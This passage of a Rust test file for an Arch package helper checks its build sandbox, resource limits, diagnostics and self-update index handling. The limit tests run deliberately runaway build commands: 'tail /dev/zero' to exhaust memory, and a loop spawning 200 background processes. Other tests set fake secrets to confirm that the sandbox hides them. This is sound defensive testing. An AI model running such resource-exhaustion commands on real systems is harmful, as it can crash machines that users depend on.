    let home = Home::new("sandbox");
    let build = |extra: &[&str]| {
        let dir = home.0.join("pkg");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        write(&dir.join("PKGBUILD"), &probe_pkgbuild(port));
        let mut args = vec!["build", dir.to_str().unwrap()];
        args.extend_from_slice(extra);
        let out = home
            .command(&args)
            .env("GITHUB_TOKEN", "secret-token")
            .env("SSH_AUTH_SOCK", "/run/user/0/agent")
            .stdin(Stdio::null())
            .output()
            .unwrap();
        (out, dir)
    };
    let report = |dir: &Path| {
        let pkg = fs::read_dir(dir)
            .unwrap()
            .flatten()
            .map(|e| e.path())
            .find(|p| p.to_string_lossy().contains(".pkg.tar"))
            .expect("a package was built");
        let out = Command::new("bsdtar")
            .arg("-xOf")
            .arg(&pkg)
            .arg("usr/share/sbprobe/report.txt")
            .output()
            .unwrap();
        String::from_utf8_lossy(&out.stdout).into_owned()
    };

    // Sandboxed: no network, no secrets, an empty home, a read-only /etc,
    // and nothing written to the real home.
    let (out, dir) = build(&[]);
    assert_eq!(
        out.status.code(),
        Some(0),
        "{}{}",
        stdout(&out),
        stderr(&out)
    );
    let r = report(&dir);
    assert!(r.contains("token=none"), "{r}");
    assert!(r.contains("agent=none"), "{r}");
    // Only the path down to the writable build directory is visible in $HOME.
    assert!(r.contains("home=[pkg ]"), "{r}");
    assert!(r.contains("etc=readonly"), "{r}");
    assert_eq!(
        hits.load(Ordering::SeqCst),
        0,
        "the build reached the network"
    );
    assert!(
        !home.0.join("emrac-probe-leak").exists(),
        "a write escaped to the real home"
    );

    // With the network allowed it can reach the listener, and still sees no secrets.
    let (out, dir) = build(&["--allow-network"]);
    assert_eq!(
        out.status.code(),
        Some(0),
        "{}{}",
        stdout(&out),
        stderr(&out)
    );
    assert!(
        hits.load(Ordering::SeqCst) >= 1,
        "--allow-network did not give network"
    );
    assert!(report(&dir).contains("token=none"));
    assert!(!home.0.join("emrac-probe-leak").exists());
}

/// Can this machine give a build a memory/process-limited cgroup scope?
fn scope_usable() -> bool {
    Command::new("systemd-run")
        .args([
            "--user",
            "--scope",
            "--quiet",
            "-p",
            "MemoryMax=1G",
            "-p",
            "TasksMax=100",
            "true",
        ])
        .stdin(Stdio::null())
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// A PKGBUILD whose `build()` is `body`.
fn limit_pkgbuild(body: &str) -> String {
    format!(
        "pkgname=lim\npkgver=1\npkgrel=1\narch=(any)\nlicense=(MIT)\nbuild() {{\n{body}\n}}\npackage() {{ install -Dm644 /dev/null \"$pkgdir/usr/share/lim/x\"; }}\n"
    )
}

#[test]
fn a_runaway_build_is_stopped_by_its_limits_and_the_reason_is_named() {
    if !sandbox_usable() || !scope_usable() {
        eprintln!("bwrap or a systemd user scope is not usable here; skipping");
        return;
    }
    let home = Home::new("limits");
    let dir = home.0.join("pkg");
    let build = |body: &str, args: &[&str]| {
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        write(&dir.join("PKGBUILD"), &limit_pkgbuild(body));
        let mut a = vec!["build", dir.to_str().unwrap()];
        a.extend_from_slice(args);
        home.command(&a).stdin(Stdio::null()).output().unwrap()
    };

    // Memory: a cap of 1% of RAM, a build that eats memory without end
    // (`tail` on a file with no newlines buffers all of it).
    assert_eq!(
        home.run(&["config", "set", "build.memory_percent", "1"])
            .status
            .code(),
        Some(0)
    );
    let out = build("  tail /dev/zero", &[]);
    assert_eq!(
        out.status.code(),
        Some(1),
        "{}{}",
        stdout(&out),
        stderr(&out)
    );
    assert!(
        stderr(&out).contains("hit its memory limit (1% of RAM)"),
        "the cause is named: {}",
        stderr(&out)
    );
    assert!(
        stderr(&out).contains("build.memory_percent"),
        "and the knob: {}",
        stderr(&out)
    );

    // Back to the default memory limit before testing the process limit.
    assert_eq!(
        home.run(&["config", "unset", "build.memory_percent"])
            .status
            .code(),
        Some(0)
    );

    // Processes: more tasks than the cap allows.
    assert_eq!(
        home.run(&["config", "set", "build.max_tasks", "32"])
            .status
            .code(),
        Some(0)
    );
    let out = build("  for i in $(seq 1 200); do sleep 30 & done; wait", &[]);
    assert_eq!(
        out.status.code(),
        Some(1),
        "{}{}",
        stdout(&out),
        stderr(&out)
    );
    assert!(
        stderr(&out).contains("hit its process limit (32 tasks)"),
        "{}",
        stderr(&out)
    );
}

#[test]
fn without_a_systemd_session_the_build_says_so_and_still_runs() {
    if !sandbox_usable() {
        eprintln!("bwrap/makepkg not usable here; skipping");
        return;
    }
    let home = Home::new("no-scope");
    let dir = home.0.join("pkg");
    fs::create_dir_all(&dir).unwrap();
    write(&dir.join("PKGBUILD"), &limit_pkgbuild("  true"));
    let out = home
        .command(&["build", dir.to_str().unwrap()])
        .env_remove("XDG_RUNTIME_DIR")
        .env_remove("DBUS_SESSION_BUS_ADDRESS")
        .stdin(Stdio::null())
        .output()
        .unwrap();
    assert_eq!(
        out.status.code(),
        Some(0),
        "{}{}",
        stdout(&out),
        stderr(&out)
    );
    assert!(
        stderr(&out).contains("memory and process limits aren't available here"),
        "{}",
        stderr(&out)
    );

    // With both limits turned off there is nothing to enforce, so no warning.
    home.run(&["config", "set", "build.memory_percent", "0"]);
    home.run(&["config", "set", "build.max_tasks", "0"]);
    let out = home
        .command(&["build", dir.to_str().unwrap()])
        .env_remove("XDG_RUNTIME_DIR")
        .env_remove("DBUS_SESSION_BUS_ADDRESS")
        .stdin(Stdio::null())
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(0));
    assert!(
        !stderr(&out).contains("limits aren't available"),
        "{}",
        stderr(&out)
    );
}

#[test]
fn doctor_reports_checks_as_json_and_exits_with_the_problem_count() {
    // Needs libalpm and a pacman configuration, like any command that reads
    // the package databases.
    if !Command::new("pacman-conf")
        .arg("DBPath")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
    {
        eprintln!("pacman-conf not usable here; skipping");
        return;
    }
    let home = Home::new("doctor");
    let out = home.run(&["doctor", "--json"]);
    let json: serde_json::Value = serde_json::from_str(&stdout(&out))
        .unwrap_or_else(|e| panic!("{e}: {}{}", stdout(&out), stderr(&out)));
    let checks = json["checks"].as_array().expect("a list of checks");
    let ids: Vec<&str> = checks.iter().map(|c| c["id"].as_str().unwrap()).collect();
    for expected in [
        "dependencies",
        "lock",
        "sync-db",
        "pacnew",
        "units",
        "orphans",
        "config",
        "tools",
    ] {
        assert!(ids.contains(&expected), "{expected} missing from {ids:?}");
    }
    for c in checks {
        assert!(c["summary"].as_str().is_some_and(|s| !s.is_empty()), "{c}");
        assert!(
            ["ok", "note", "warning", "problem"].contains(&c["status"].as_str().unwrap()),
            "{c}"
        );
    }
    // Problems sort first, and the exit status is 1 exactly when there is one.
    let rank = |s: &str| {
        ["ok", "note", "warning", "problem"]
            .iter()
            .position(|x| *x == s)
            .unwrap()
    };
    let ranks: Vec<usize> = checks
        .iter()
        .map(|c| rank(c["status"].as_str().unwrap()))
        .collect();
    assert!(ranks.windows(2).all(|w| w[0] >= w[1]), "{ranks:?}");
    let problems = checks.iter().filter(|c| c["status"] == "problem").count();
    assert_eq!(out.status.code(), Some(if problems > 0 { 1 } else { 0 }));
    if problems > 0 {
        assert!(stderr(&out).starts_with("emrac found:"), "{}", stderr(&out));
    }
}

#[test]
fn doctor_report_is_markdown_without_the_users_identity() {
    if !Command::new("pacman-conf")
        .arg("DBPath")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
    {
        eprintln!("pacman-conf not usable here; skipping");
        return;
    }
    let home = Home::new("doctor-report");
    let hostname = fs::read_to_string("/proc/sys/kernel/hostname")
        .unwrap_or_default()
        .trim()
        .to_string();
    let out = home
        .command(&["doctor", "--report"])
        .env("USER", "zebrafish42")
        .stdin(Stdio::null())
        .output()
        .unwrap();
    let text = stdout(&out);
    assert!(text.starts_with("### emrac doctor report"), "{text}");
    assert!(
        text.contains("- emrac ") && text.contains("installed packages"),
        "{text}"
    );
    assert!(
        text.contains("Pacman v"),
        "the version line is clean: {text}"
    );
    assert!(
        !text.contains("--."),
        "no ASCII-art banner leaked in: {text}"
    );
    assert!(!text.contains("zebrafish42"));
    assert!(!text.contains(home.0.to_str().unwrap()));
    if hostname.len() > 2 {
        assert!(!text.contains(&hostname), "the host name is scrubbed");
    }
}

#[test]
fn self_check_works_without_pacman_and_fails_on_a_broken_config() {
    let home = Home::new("selfcheck");
    let out = home.run(&["self", "check"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    let text = stdout(&out);
    assert!(
        text.contains("Installation") && text.contains("Operation journal"),
        "{text}"
    );
    let json: serde_json::Value =
        serde_json::from_str(&stdout(&home.run(&["self", "check", "--json"]))).unwrap();
    assert!(json["checks"]
        .as_array()
        .unwrap()
        .iter()
        .any(|c| c["id"] == "owner"));

    fs::create_dir_all(home.0.join(".config/emrac")).unwrap();
    write(
        &home.0.join(".config/emrac/config.toml"),
        "this is = = not toml\n",
    );
    let out = home.run(&["self", "check"]);
    assert_eq!(out.status.code(), Some(1), "a broken config is a problem");
    assert!(
        stdout(&out).contains("config.toml can't be read"),
        "{}",
        stdout(&out)
    );
}

#[test]
fn self_sync_and_news_use_the_configured_source_and_keep_the_last_good_index() {
    let home = Home::new("selfsync");
    let sha = "a20701e9d20b4a677c1dc1c6333682d09f7f5c65a3c0afad26396630bf1a6c40";
    let index = |extra: &str| {
        format!(
            r#"{{"schema":1,"releases":[{{"tag":"r9","version":"9.0.0","date":"2026-10-15","channel":"stable","tarball":"https://github.com/pardhuvarmax/emrac/archive/refs/tags/r9.tar.gz","sha256":"{sha}"{extra}}}],"news":[{{"date":"2026-10-15","category":"release","title":"Emrac r9","summary":"Nine.","version":"9.0.0"}}]}}"#
        )
    };
    let src = home.0.join("releases.json");
    write(&src, &index(""));
    let source = format!("file://{}", src.display());

    // Nothing fetched yet.
    let out = home.run(&["self", "news"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(
        stdout(&out).contains("no release news yet"),
        "{}",
        stderr(&out)
    );

    assert_eq!(
        home.run(&["config", "set", "self.source", &source])
            .status
            .code(),
        Some(0)
    );
    let out = home.run(&["self", "sync", "--dry-run"]);
    assert!(
        stdout(&out).contains("Synchronisation plan") && stdout(&out).contains("none (dry run)"),
        "{}",
        stdout(&out)
    );
    assert!(
        !home
            .0
            .join(".local/share/emrac/self/releases.json")
            .exists(),
        "a dry run fetches nothing"
    );

    let out = home.run(&["self", "sync"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert!(stdout(&out).contains("1 new (r9)"), "{}", stderr(&out));
    assert!(
        stdout(&out).contains("a newer release is out: r9"),
        "{}",
        stderr(&out)
    );

    let out = home.run(&["self", "news"]);
    assert!(
        stdout(&out).contains("Emrac r9") && stdout(&out).contains("[newer than yours]"),
        "{}",
        stdout(&out)
    );
    let json: serde_json::Value =
        serde_json::from_str(&stdout(&home.run(&["self", "news", "--json"]))).unwrap();
    assert_eq!(json["items"][0]["newer_than_installed"], true);

    // A rejected index changes nothing and says why.
    write(&src, &index("").replace(sha, "short"));
    let out = home.run(&["self", "sync"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("rejected"), "{}", stderr(&out));
    assert!(stdout(&home.run(&["self", "news"])).contains("Emrac r9"));

    // --offline refuses a network source without touching it.
    assert_eq!(
        home.run(&[
            "config",
            "set",
            "self.source",
            "https://example.invalid/releases.json"
        ])
        .status
        .code(),
        Some(0)
    );
    let out = home.run(&["--offline", "self", "sync"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("--offline"), "{}", stderr(&out));
}

#[test]
fn self_diagnose_extends_check_hides_the_home_directory_and_refuses_online_offline() {
    let home = Home::new("selfdiag");
    let out = home.run(&["self", "diagnose"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    let text = stdout(&out);
    for want in [
        "Installation",
        "Upgrade tools",
        "Space to build",
        "Platform",
    ] {
        assert!(text.contains(want), "{want} in {text}");
    }
    assert!(
        !text.contains(home.0.to_str().unwrap()),
        "the home directory is hidden: {text}"
    );
    let out = home.run(&["--offline", "self", "diagnose", "--online"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("pick one"), "{}", stderr(&out));
    // --online with a file source answers without a network.
    let src = home.0.join("releases.json");
    write(&src, r#"{"schema":1,"releases":[],"news":[]}"#);
    home.run(&[
        "config",
        "set",
        "self.source",
        &format!("file://{}", src.display()),
    ]);
    let out = home.run(&["self", "diagnose", "--online"]);
    assert!(stdout(&out).contains("answered"), "{}", stdout(&out));
}

#[test]
fn self_upgrade_plans_from_the_synced_index_and_refuses_a_copy_no_package_owns() {
    let home = Home::new("selfup");
    let sha = "a20701e9d20b4a677c1dc1c6333682d09f7f5c65a3c0afad26396630bf1a6c40";
    let src = home.0.join("releases.json");
    write(
        &src,
        &format!(
            r#"{{"schema":1,"releases":[{{"tag":"r9","version":"9.0.0","date":"2026-10-15","channel":"stable","tarball":"https://github.com/pardhuvarmax/emrac/archive/refs/tags/r9.tar.gz","sha256":"{sha}"}}],"news":[]}}"#
        ),
    );
    let source = format!("file://{}", src.display());

    // No release information yet.
    let out = home.run(&["self", "upgrade", "--dry-run"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stdout(&out).contains("self sync"), "{}", stdout(&out));

    home.run(&["config", "set", "self.source", &source]);
    assert_eq!(home.run(&["self", "sync"]).status.code(), Some(0));
    // The test binary is a development build: no package owns it, so it is
    // never replaced, and the plan says why.
    let out = home.run(&["self", "up", "--dry-run"]);
    assert_eq!(out.status.code(), Some(1));
    let text = stdout(&out);
    assert!(
        text.contains("cannot be done") && text.contains("development build"),
        "{text}"
    );
    let json: serde_json::Value = serde_json::from_str(&stdout(&home.run(&[
        "self",
        "upgrade",
        "--dry-run",
        "--json",
    ])))
    .unwrap();
    assert_eq!(json["outcome"]["status"], "refused");
    assert_eq!(json["op"], "upgrade");
    // Nothing was started.
    assert!(!home.0.join(".local/share/emrac/self/journal.json").exists());
}

#[test]
fn config_refresh_restyles_an_old_plain_file_and_keeps_its_values() {
    let home = Home::new("refresh");
    let path = home.0.join(".config/emrac/config.toml");
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    write(&path, "[flags]\nyes = true\n\n[cache]\npolicy = \"lean\"\n");

    let out = home.run(&["config", "refresh"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    let text = fs::read_to_string(&path).unwrap();
    assert!(text.starts_with("# ╔"), "{text}");
    assert!(
        text.contains("yes = true") && text.contains("◂ changed"),
        "{text}"
    );
    assert_eq!(
        stdout(&home.run(&["config", "get", "flags.yes"])).trim(),
        "true"
    );
    assert_eq!(
        stdout(&home.run(&["config", "get", "cache.policy"])).trim(),
        "lean"
    );

    // Already in the current style: nothing to do, the file is untouched.
    let out = home.run(&["config", "refresh"]);
    assert!(
        stdout(&out).contains("already in the current style"),
        "{}",
        stdout(&out)
    );
    assert_eq!(fs::read_to_string(&path).unwrap(), text);

    // A file that does not parse is not touched.
    write(&path, "not = = toml\n");
    let out = home.run(&["config", "refresh"]);
    assert_eq!(out.status.code(), Some(1));
    assert_eq!(fs::read_to_string(&path).unwrap(), "not = = toml\n");
}

#[test]
fn the_test_helper_does_not_pass_makepkgs_folders_on_to_emrac() {
    // `makepkg` runs `check()` with PKGDEST and friends set when `emrac self
    // upgrade` (or an AUR helper) started it; a sandbox test that builds a
    // fixture package must not leave it where the next test will find it.
    let home = Home::new("helperenv");
    let cmd = home.command(&["--version"]);
    let removed: Vec<String> = cmd
        .get_envs()
        .filter(|(_, v)| v.is_none())
        .map(|(k, _)| k.to_string_lossy().into_owned())
        .collect();
    for var in ["PKGDEST", "SRCDEST", "SRCPKGDEST", "LOGDEST", "BUILDDIR"] {
        assert!(removed.iter().any(|r| r == var), "{var} is passed through");
    }
}
